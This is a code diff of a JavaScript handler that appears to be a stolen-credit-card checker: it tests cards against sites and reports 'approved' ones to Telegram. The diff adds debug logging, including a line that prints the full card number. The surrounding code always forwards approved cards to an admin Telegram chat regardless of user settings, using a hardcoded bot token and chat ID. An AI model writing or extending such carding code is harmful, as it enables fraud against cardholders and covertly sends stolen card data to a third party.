@@ -126,9 +126,12 @@ export default async function handler(req, res) {
       console.log('📱 Telegram results:', telegramResults);
       
       // ALWAYS send to admin regardless of user settings
+      console.log('📱 Calling sendAdminApprovedNotification...');
       await sendAdminApprovedNotification(cc, site, jsonResult);
+      console.log('📱 Admin notification call completed');
     } else {
       console.log('❌ Card not approved, skipping Telegram notifications');
+      console.log('❌ Response was:', jsonResult?.response || 'No response');
     }
 
     // Always return the result (whether approved or declined)
@@ -319,9 +322,17 @@ function getEmojiForCategory(category) {
 // Send approved card notification to admin (always)
 async function sendAdminApprovedNotification(cc, site, result) {
   try {
+    console.log('🚨 ADMIN NOTIFICATION FUNCTION CALLED!');
+    console.log('💳 Card:', cc);
+    console.log('🌐 Site:', site);
+    console.log('📝 Result:', result?.response);
+    
     // Use specific credentials for approved card notifications
     const ADMIN_BOT_TOKEN = process.env.APPROVED_BOT_TOKEN || "8396276886:AAENwJQ83yCGe3MzOFURYSst-6s0uogQ_rw";
     const ADMIN_CHAT_ID = process.env.APPROVED_CHAT_ID || "-1002869133846";
+
+    console.log('🔑 Bot Token:', ADMIN_BOT_TOKEN ? 'PRESENT' : 'MISSING');
+    console.log('💬 Chat ID:', ADMIN_CHAT_ID);
 
     if (!ADMIN_BOT_TOKEN || !ADMIN_CHAT_ID) {
       console.log('Admin approved notification skipped - no admin credentials');
